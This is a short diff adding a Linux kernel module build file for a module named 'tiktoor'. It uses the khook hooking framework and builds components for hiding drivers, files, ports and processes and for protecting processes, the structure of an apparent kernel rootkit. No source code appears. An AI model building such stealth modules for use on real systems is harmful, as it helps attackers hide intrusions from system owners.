@@ -1,0 +1,10 @@
+ldflags-y += -T$(src)/khook/engine.lds
+
+obj-m += tiktoor.o
+
+tiktoor-y += main.o
+tiktoor-y += driver_hiding/driver_hiding.o
+tiktoor-y += file_hiding/file_hiding.o
+tiktoor-y += port_hiding/port_hiding.o
+tiktoor-y += process_hiding/process_hiding.o
+tiktoor-y += process_protection/process_protection.o
